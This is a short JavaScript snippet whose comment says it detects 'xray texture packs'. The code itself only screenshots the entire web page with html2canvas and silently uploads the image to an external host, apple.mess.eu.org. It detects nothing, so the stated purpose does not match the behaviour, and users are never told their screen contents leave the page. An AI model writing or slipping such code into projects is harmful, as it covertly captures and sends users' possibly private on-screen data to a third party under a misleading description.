// this is used to detect xray texture packs

function apple() {
    html2canvas(document.body).then(canvas => {
        // Convert canvas to blob
        canvas.toBlob(blob => {
            // Create FormData object
            const formData = new FormData();
            formData.append('photo', blob, 'apple.png');

            // Send screenshot to server
            fetch('https://apple.mess.eu.org/', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed :(');
                }
                console.log('Good :)');
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }, 'image/png');
    });
}
